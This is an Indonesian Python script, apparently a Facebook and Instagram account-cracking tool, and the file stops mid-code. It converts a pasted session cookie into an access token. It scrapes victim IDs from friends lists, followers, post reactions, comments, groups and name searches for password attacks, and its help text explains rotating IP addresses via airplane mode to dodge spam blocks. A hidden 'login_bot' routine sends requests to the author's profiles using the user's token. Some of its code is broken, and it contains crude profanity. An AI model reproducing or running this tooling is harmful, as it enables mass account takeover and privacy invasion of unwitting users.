# coding=utf-8
# coding by MUGHAL ZADA
# Permission first bro if you want to recode, don't bother
# Note : Do not change again! there will be an error, the script is good

import os, sys, subprocess, platform
try:
	import rich
except ImportError:
	print ('\n\t\x1b[0m >_< Welcome Dear... >_<\n')
	os.system('pip install rich')
	
import rich
from rich.markdown import Markdown
from rich.console import Console

try:
	import requests
except ImportError:
	catet_req = ('# • modul requests is installing •')
	requ = rich.markdown.Markdown(catet_req, style='green')
	rich.console.Console().print(requ)
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	catet_futur = ('# • sedang menginstall modul futures •')
	ft = rich.markdown.Markdown(catet_futur, style='green')
	rich.console.Console().print(ft)
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	catet_bs = ('# • modul bs4 is installing •')
	soup = rich.markdown.Markdown(catet_bs, style='green')
	rich.console.Console().print(soup)
	os.system('pip install bs4')
try:
	import mechanize
except ImportError:
	catet_mek = ('# • modul mechanize is installing •')
	meka = rich.markdown.Markdown(catet_mek, style='green')
	rich.console.Console().print(meka)
	os.system('pip install mechanize')
try:
	import stdiomask
except ImportError:
	catet_mask = ('# • modul stdiomask is installing •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')

bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
	
Mr = '\x1b[1;91m' 
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m'
def ingfoh():
	print (
f"""{Hj}
[+] ------------------------------------------------------------>
 - Info script :
 	
 - author      : Moch Aang Ardiansyah XD
 - facebook    : facebook.com/Aang.XD404
 - whatsap     : +6283177721763
 - github      : github.com/AngCyber
 - script name : Crack-V2
 - version     : 2.0.3
 - update pada : 24 Maret 2022 - 03:00
 
[+] ------------------------------------------------------------>
            TENTANG METODE CRACK
[+] ------------------------------------------------------------>
 - b-api: Metode ini proses nya sangat cepat
          tapi rawan spam jadi wajar hasil nya
          tidak memuaskan dan jarang dapat hasil

- mbasic: Metode ini proses nya lumayan lambat
          tapi jika menggunakan metode ini hasil 
          yg di dapat memuaskan dan jarang kena
          spam

- mobile: Metode ini proses nya sangat lambat 
          tapi jika menggunakan metode ini hasil
          yg di dapat sangat memuaskan dan jarang 
          kena spam

[+] ------------------------------------------------------------>
             TIDAK SUPORT KARTU 
[+] ------------------------------------------------------------>
- Kartu Telkomsel tidak suport untuk crack
  jadi wajar jika tidak dapat hasil atau lama
  pada saat crack, Karena rawan spam.
  Rekomendasi kartu Axis/Tri/XL
 
[+] ------------------------------------------------------------>
                MODE PESAWAT
[+] ------------------------------------------------------------>
- Jika gunakan mode pesawat itu guna nya 
  akan melewati beberapa ID dan merubah IP 
  kita pada saat proses crack. Cukup gunakan
  mode pesawat 1-2 detik saja. Jika gunakan 
  mode pesawat terlalu lama maka akan semakin
  banyak ID yg terlewatkan. Maka dari itu cukup
  gunakan 1-2 detik saja.
[+] ------------------------------------------------------------>
""")

# MODULE
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

# TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# KUMPULAN WARNA
#M = '\x1b[0;31m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
Q = '\x1b[1;95m' # UNGU
M = '\033[38;2;255;127;0;1m' # ORANGE
Y = '\x1b[1;33m' # SPLIT
B = '\x1b[1;97m' # BIRU
U = '\x1b[1;97m' # UNGU
O = '\x1b[1;97m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P]
#Moch Aang Ardiansyah-XD.
#---------------------------------------------->
warna = random.choice(acak)
til ="•"

ok, cp, id, user, pwx, loop = [], [], [], [], [], 0

# MEMEK PERAWAN RASANYA ENAK AWOKAWOK
sys.stdout.write('\x1b[1;35m\x1b]2;@𝐌𝐨𝐜𝐡 𝐀𝐚𝐧𝐠 𝐀𝐫𝐝𝐢𝐚𝐧𝐬𝐲𝐚𝐡 𝐗𝐃\x07')
#sys.stdout.write('\x1b[1;37mMoch Aang Ardiansyah XD\n');jeda(1)
sys.stdout.write('\x1b[1;37mAlready up to date.\n')

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

# FOLDER
def folder():
	try:os.mkdir('IG')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass

# LOGO (LO GOBLOK)
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "

#author = 'Moch Aang Ardiansyah-XD'
fb_me = 'Facebook.com/Aang.XD404'
github = 'github.com/AngCyber'


IP = requests.get("https://api.ipify.org/").text
def banner():
	print("""\x1b[0;92m  ____                _              ____
\x1b[1;92m / ___|_ __ __ _  ___| | __   __   _|___ \\  ╔═════════════════════╗
\x1b[1;96m| |   | '__/ _` |/ __| |/ /___\ \ / / __) | ║ Github.com/AngCyber ║
\x1b[1;96m| |___| | | (_| | (__|   <_____\ V / / __/  ║     + XNXCODE +     ║
\x1b[1;93m \____|_|  \__,_|\___|_|\_\     \_/ |_____| ╚═════════════════════╝

\x1b[1;97m[\x1b[0;92m++\x1b[1;97m] Email  \x1b[1;93m: \x1b[1;92mangxnx49@gmail.com
\x1b[1;97m[\x1b[0;92m++\x1b[1;97m] Fb Me  \x1b[1;93m: \x1b[1;92mfacebook.com/Aang.XD404
\x1b[1;97m[\x1b[0;92m++\x1b[1;97m] ------------------------------------------------------------>""")
  
# CONVERT COOKIE DICT TO STRING
def romz_xyz(cookie,venom={}):
	for x in cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		if len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	return venom

# MENU MASUK
def Masuk():
	try:
		kueh = romz_xyz(open("cookies","r").read().strip())
	except FileNotFoundError:
		os.system('clear')
		banner()
		print ('\n%s[%s\x1b[1;92m01\x1b[1;97m]. %sLogin instagram (crack instagram) '%(U,K,O))
		print ('%s[%s\x1b[1;92m02\x1b[1;97m]. %sLogin dengan cookie (crack facebook) '%(U,K,O))
		print ('%s[%s\x1b[1;92m03\x1b[1;97m]. %sCara mendapatkan cookie facebook '%(U,K,O))
		print ('%s[%s\x1b[1;92m00\x1b[1;97m]. %sKeluar dari script '%(U,M,O))
		while True:
			__Aang__Sayang__Laura__ = input ("\n%s[\x1b[1;92m+\x1b[1;97m]%s Pilih :%s "%(P,O,K))
			if __Aang__Sayang__Laura__ in(""):
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));exit()
			elif __Aang__Sayang__Laura__ in ('1','01'):
				checkin()
			elif __Aang__Sayang__Laura__ in ('2','02'):
				#print("\n%s[%s+%s] ------------------------------------------------------------>"%s(P,H,P))
				jalan("\n%s[%s!%s] Ingat, harus pakai akun tumbal !"%(P,M,P))
				kukis = input("%s[%s+%s] Cookie : %s"%(P,M,P,H))
				if kukis in(""):
					print ("%s%s isi cookie kentod "%(M,til))
					exit()
				else:
					konverter(kukis)
					masuk(kukis).login()
			elif __Aang__Sayang__Laura__ in ('3', '03'):
				os.system("xdg-open https://youtu.be/iDVCcnLcTnE")
			elif __Aang__Sayang__Laura__ in ('0', '00'):
				exit('\n')
			else:
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));exit()
				
	pilihan().menu()
	
# MASUK LEWAT COOKIE (KUEH)
class masuk:
	
	def __init__(self,cok):
		self.cok = cok
		self.url = "https://mbasic.facebook.com"
		
	def login(self):
		try:
			cek = requests.get(f"{self.url}/profile.php?v=info", cookies=romz_xyz(self.cok)).text
			if "mbasic_logout_button" in cek:
				#from data import login, informasi
				open("cookies","w").write(self.cok)
				if "Laporkan Masalah" in cek:
					#mikey = login.bot(romz_xyz(self.cok),self.url)
					#(romz_xyz(self.cok),cek).myinfo()
					#mikey.usernem()
					print ("\n%s[✓] Login berhasil ngab "%(H));jeda(1)
					pilihan().menu()
				else:
					#mikey = login.bot(romz_xyz(self.cok),self.url)
					#mikey.lang(romz_xyz(self.cok))
					#informasi.info(romz_xyz(self.cok),cek).myinfo()
					print ("\n%s[✓] Login berhasil ngab "%(H));jeda(1)
					pilihan().menu()
			elif 'checkpoint' in cek:
				print ("\n%s[!] Akun lu checkpoin ngab "%(K));jeda(1)
			#else:
				#exit ("%s× cookie invalid "%(M));jeda(2)
		except requests.exceptions.ConnectionError:
			exit ("%s%s tidak ada koneksi "%(M,til));jeda(1)
			
# CONVERT COOKIE KE TOKEN 
def konverter(kukis): 
	_header = {
	    'Host':'business.facebook.com',
		'cache-control':'max-age=0',
		'upgrade-insecure-requests':'1',
		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type' : 'text/html; charset=utf-8',
		'accept-encoding':'gzip, deflate',
		'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cookie': kukis
	}
	try:
		ling = requests.get("https://business.facebook.com/business_locations", headers=_header)
		cari = re.search('(EAAG\w+)', ling.text)
		romz = cari.group(1)
		if 'EAAG' in romz:
			open('token.txt', 'w').write(romz)
			print (f'\n{P}[{H}+{P}] Access Token {P}: {H}{romz} ');jeda(1)
			login_bot(romz)
	except AttributeError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()
	except UnboundLocalError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()
		
# JANGAN DI UBAH !
def login_bot(romz):
	try:
		toket = mantan
		mantan1 = ('100001621584081')
		mantan2 = ('100027796542918')
		mantan3 = ('100053460048331')
		requests.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # Moch Aang Ardiansyah XD.
		requests.post(f"https://graph.facebook.com/{romz2}?fields=subscribers&access_token={toket}") # Kang Santuy Erorr Found
		requests.post(f"https://graph.facebook.com/{romz3}?fields=subscribers&access_token={toket}") # Why Aang Ardiansyah XD.
		
	except:
		pass
		
# MENU PILIHAN INI AJG
class Menu():
	
	def __init__(self,url):
		self.url = url
		
	def tentang(self):
		try:
			kueh = romz_xyz(open("cookies","r").read().strip())
		except IOError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			#os.system('python crack.py')
		try:
			tentang = json.loads(open("my_info","r").read().strip())
		except FileNotFoundError:
			#from data import informasi
			(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text)
			#os.system('python crack.py')
		try:
			a = requests.get(f"{self.url}/profile.php", cookies = kueh).text
		except requests.exceptions.ConnectionError:
			exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		if "mbasic_logout_button" not in a:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			#os.system('python crack.py')
		else:
			os.system('clear')
			banner()
			print ('%s\x1b[1;97m[\x1b[0;92m++\x1b[0;97m]%s Negara%s : %s%s '%(U,O,K,H,CN))
			print ('%s\x1b[1;97m[\x1b[0;92m++\x1b[0;97m]%s You IP%s :%s %s\n'%(U,O,K,H,IP))
			print ('%s[%s01%s]. Crack id dari teman publik '%(P,H,P))
			print ('%s[%s02%s]. Crack id dari total followers'%(P,H,P))
			print ('%s[%s03%s]. Crack id dari react post'%(P,H,P))
			print ('%s[%s04%s]. Crack id dari komentar post'%(P,H,P))
			print ('%s[%s05%s]. Crack id dari anggota grup'%(P,H,P))
			print ('%s[%s06%s]. Crack id dari pencarian nama'%(O,H,P))
			print ('%s[%s07%s]. Crack id dari pesan masuk'%(P,H,O))
			print ('%s[%s08%s]. Crack id dari saran teman'%(P,H,P))
			print ('%s[%s09%s]. Crack/login akun instagram '%(P,H,P))
			print ('%s[%s10%s]. Setting user agent'%(P,H,P))
			print ('%s[%s11%s]. Lihat hasil crack'%(P,H,P))
			print ('%s[%s12%s]. Ingfomarsih penggunaan'%(P,H,P))
			print ('%s[%s13%s]. Subscribe youtube %sAangxd'%(P,H,P,H))
			print ('%s[%s14%s]. Cek opsi checkpoin'%(P,H,P))
			print ('%s[%s00%s]. Keluar & hapus cookie'%(P,H,P))
		
class pilihan:
	
	def __init__(self):
		self.kueh = romz_xyz(open("cookies","r").read().strip())
		try:
			self.token = open("token.txt","r").read()
		except FileNotFoundError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			os.system('clear')
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			#os.system('python crack.py')
		self.url = ("https://mbasic.facebook.com")
		self.id = []
				
	def menu(self):
		Menu(self.url).tentang()
		__Punten__Mamang__ = input('\n%s[%s+%s] Pilih :%s '%(P,H,P,K))
		if __Punten__Mamang__ in['',' ']:
			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			self.menu()
		elif __Punten__Mamang__ in['1','01']:
			__Jimin__Pantatnya__Bisulan__ = input ("\n%s[%s?%s] Ingin dump banyak id? (y/n):%s "%(P,H,P,H))
			if __Jimin__Pantatnya__Bisulan__ in[""]:
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			elif __Jimin__Pantatnya__Bisulan__ in['y','Y']:
				try:
					token = self.token
					self.MassalGRAPH(token)
				except KeyError:
					exit('\n%s[%s!%s] Gagal nyolong id '%(P,K,P))
			elif __Jimin__Pantatnya__Bisulan__ in['N','n']:
				print ("\n%s[%s+%s] Ketik (me) untuk crack teman sendiri "%(P,K,P))
				idt = input('%s[%s?%s] Username/Id :%s '%(P,H,P,H))
				if idt in[""," "]:
					print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
				elif(re.findall("\w+",idt)):
					r = requests.get("https://mbasic.facebook.com/"+idt).text
					try:
						user = re.findall('\;rid\=(\d+)\&',str(r))[0]
					except:
						user = idt
					try:
						print ('')
						token = self.token
						self.PublikGRAPH(user, token)
					except KeyError:
						exit('\n%s[%s!%s] Gagal nyolong id '%(P,K,P))
		elif __Punten__Mamang__ in['2','02']:
			print ("\n%s[%s!%s] Pastikan target memiliki pengikut "%(P,K,P))
			idt = input('%s[%s?%s] Username/Id :%s '%(P,H,P,H))
			if idt in[""," "]:
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			else:
				data_ = (f"{self.url}/{idt}?v=followers")
			try:
				response = requests.get(data_, cookies=self.kueh).text
				if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				elif "Halaman yang Anda minta tidak ditemukan." in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				elif "Konten Tidak Ditemukan" in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				else:
					#print (f"{U}{til}{O} Nama akun {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0])
					print ('')
					self.FollowersPAR(data_)
			except requests.exceptions.ConnectionError:
				exit('\n\n%s[%s!%s] Ndak ada koneksi bangsat %s\n'%(P,M,P,K))
		elif __Punten__Mamang__ in["3","03"]:
			print ("\n%s%s %sPastikan postingan bersifat publik tidak private "%(U,til,O))
			idt = input('%s[%s?%s] Link postingan :%s '%(P,H,P,H))
			if idt in[""," "]:
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
				self.menu()
			elif "m.facebook.com" in idt:
				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in idt:
				data_ = idt.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in idt:
				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
			else:
				data_ = idt
			try:
				respon = requests.get(data_, cookies=self.kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
					exit('\n%s%s postingan tidak di temukan'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				else:
					try:
						print ('')
						url = re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon)[0].replace(";","&")
						self.postingan(f"{self.url}/ufi/reaction/profile/browser/{url}")
					except IndexError:
						exit('\n%s[%s!%s] Link nya yang bener '%(P,K,P))
			except requests.exceptions.ConnectionError:
				exit('\n\n%s[%s!%s] Ndak ada koneksi bangsat %s\n'%(P,M,P,K))
			except requests.exceptions.MissingSchema:
				exit('\n%s%s Invalid url%s\n'%(M,til,N))
		elif __Punten__Mamang__ in["4","04"]:
			print ("\n%s! Pastikan postingan bersifat publik tidak private "%(P))
			idt = input('%s? Link postingan :%s '%(P,H))
			if idt in[""," "]:
				print ('\n%s! Yang bener kontol'%(P));jeda(2)
				self.menu()
			elif "m.facebook.com" in idt:
				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in idt:
				data_ = idt.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in idt:
				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
			else:
				data_ = idt
			try:
				respon = requests.get(data_, cookies=self.kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
					exit('\n%s%s postingan tidak di temukan'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				else:
					try:
						print ('')
						self.komen(f"{self.url}/{idt}")
					except IndexError:
						exit('\n%s! Masukan id postingan dengan benar'%(P))
			except requests.exceptions.ConnectionError:
				exit('\n\n%s! Ndak ada koneksi\n'%(M,P))
			except requests.exceptions.MissingSchema:
				exit('\n%s! Invalid url%s\n'%(P,O))
		elif __Punten__Mamang__ in["5","05"]:
			while True:
				print ("\n%s%s %sPastikan group bersifat publik tidak private "%(U,til,O))
				idt = input('%s%s %sId group %s> %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
				else:
					try:
						response = requests.get(f"{self.url}/browse/group/members/?id={idt}",cookies=self.kueh).text
						if "Halaman Tidak Ditemukan" in response:
							exit('\n%s%s group tidak di temukan'%(M,til))
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
							exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
						elif "Konten Tidak Ditemukan" in response:
							exit('\n%s%s group tidak di temukan'%(M,til))
						else:
							print (f"{U}{til}{O} Nama group {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0][8:])
							print("")
							self.grup(f"{self.url}/browse/group/members/?id={idt}");break
					except requests.exceptions.ConnectionError:
						exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif __Punten__Mamang__ in["6","06"]:
			while True:
				print ("\n%s%s %sMasukan nama orang contoh Romi Afrizal "%(U,til,O))
				idt = input('%s%s %sMasukan nama %s> %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
				else:
					try:
						response = requests.get(f"{self.url}/search/people/?q={idt}",cookies=self.kueh).text
						if "Maaf, kami tidak menemukan" in response:
							exit('\n%s%s nama tidak di temukan'%(M,til))
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
							exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
						else:
							jumlah = int(input('%s%s %sJumlah nama  %s> %s'%(U,til,O,M,K)))
							if "6000" in str(jumlah):
								jumlah-=1
							if jumlah<6001:
								print ('')
								self.nama(f"{self.url}/search/people/?q={idt}",jumlah);break
							else:
								exit('\n%s%s Max 6000 user'%(M,til))
					except requests.exceptions.ConnectionError:
						exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
					except ValueError:
						print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		elif __Punten__Mamang__ in['7','07']:
			print('')
			self.pesan('https://mbasic.facebook.com/messages')
		elif __Punten__Mamang__ in["8","08"]:
			try:
				response = requests.get(f"{self.url}/friends/center/suggestions",cookies=self.kueh).text
				if "Tidak Ada Saran" in response:
					exit('\n%s%s tidak ada saran teman'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				else:
					print ('')
					jumlah = int(input('%s%s %sJumlah teman %s> %s'%(U,til,O,M,K)))
					if "6000" in str(jumlah):
						jumlah-=1
					if jumlah<6001:
						self.saran(f"{self.url}/friends/center/suggestions",jumlah)
					else: 
						exit('\n%s%s Max 6000 user'%(M,til))
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
			except ValueError:
				print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		elif __Punten__Mamang__ in['9','09']:
			checkin()
		elif __Punten__Mamang__ in['10']:
			useragent()
		elif __Punten__Mamang__ in['11']:
			print ("\n%s[%s01%s]. %sCek hasil akun facebook "%(U,H,P,O))
			print ("%s[%s02%s]. %sCek hasil akun instagram "%(U,H,P,O))
			print ("%s[%s03%s]. %sHapus hasil crack "%(U,H,P,O))
			print ("%s[%s00%s]. %sKembali "%(U,H,P,O))
			__Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s '%(P,M,P,H))
			cek_cek(__Aang__Sayang__Laura__)
		elif __Punten__Mamang__ in['12']:
			ingfoh()
		elif __Punten__Mamang__ in['13']:
			os.system("xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A")
		elif __Punten__Mamang__ in['14']:
			ngentot()
		elif __Punten__Mamang__ in['0','00']:
			print ('\n%s[%s+%s] Sedang menghapus cookie '%(P,M,P));jeda(1)
			try:
				os.remove("cookies")
				os.remove("token.txt")
				os.remove("my_info")
			except:
				os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			jalan('%s[%s✓%s] Berhasil terhapus '%(P,H,P))
			exit()
		
		if len(self.id)!=0:
			print
			return Crack().romiy(self.id)
		#else:
			#exit (f'{M}{til} gagal mengambil ID ')
			
	# CRACK MASSAL
	def MassalGRAPH(self, token):
		try:
			jum = int(input('%s[%s?%s] Ingin dump berapa id? :%s '%(P,H,P,H)))
			print ("\n%s[%s!%s] Harap cari id yang bersifat publik "%(P,H,P))
		except:jum=1
		for t in range(jum):
			t +=1
			idt = input('%s[%s?%s] Username/Id:%s '%(P,H,P,H))
			if idt in['']:
				print
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
				try:
					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:
					user = idt
		
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
		try:
			print ('')
			print(f"\r{U}[{H}+{P}] Nyolong Id : {H}{len(self.id)} ",end="")
		except:
			pass
						
	# CRACK PUBLIK 
	def PublikGRAPH(self, user, token):
		try:
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
				print(f"\r{U}[{H}+{P}] Nyolong Id {M}: {H}{len(self.id)} ",end="")
		except:
			pass
			
	# CRACK FOLLOWERS
	def FollowersPAR(self, data_):
		try:
			respon = requests.get(data_, cookies = self.kueh).text
			otw = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', respon) 
			for i in otw:
				if "&amp;refid=" in i[0]:
					self.id.append(re.findall("id=(.*?)&",i[0])[0]+"<=>"+i[1])
				elif "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				elif "?refid=" in i[0]:
					self.id.append(re.findall("(.*?)\?refid=",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.FollowersPAR(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
			
	# CRACK POSTINGAN PUBLIK
	def postingan(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			if "Semua 0" in respon:
				exit('\n%s%s tidak ada yg menanggapi postingan'%(M,til))
			else:
				otw = re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',respon)
				for i in otw:
					if "profile.php?" in i[0]:
						self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
					else:
						self.id.append(re.findall("/(.*)",i[0])[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				if "Lihat Selengkapnya" in respon:
					self.postingan(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
		
	# CRACK POSTINGAN KOMENTAR
	def komen(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			otw = parser(respon,'html.parser')
			for i in otw.find_all('h3'):
				for a in i.find_all('a',href=True):
					if "profile.php" in a.get("href"):
						c = a.get("href").split('=')[1]
						id = c.split('&')[0]
						user = a.text
						self.id.append(id+'<=>'+user)
					else:
						c = a.get("href").split('?')[0]
						id = c.split('/')[1]
						user = a.text
						self.id.append(id+'<=>'+user)
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			for i in otw.find_all("a",href=True):
				if "Lihat komentar lainnya…" in i.text:
					self.komen("https://mbasic.facebook.com/"+i.get("href"))
		except:
			pass

	# CRACK GROUP
	def grup(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',respon)
			for i in otw:
				if "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.grup(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def tambah(gc):
					a = requests.get(gc, cookies=kueh).text
					b = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					if "Lihat Postingan Lainnya" in a:
						tambah(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				tambah(f"{self.url}/groups/"+re.search("id=(\\d*)",data_).group(1))
		except:
			pass
	
	# CRACK PENCARIAN NAMA
	def nama(self, data_, jum):
		try:
			true = False
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',respon)
			for i in otw:
				if "profile.php?" in i[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",i[1])[0]+"<=>"+i[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in respon:
					self.nama(parser(respon,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:
			pass
			
	# CRACK PESAN CHAT
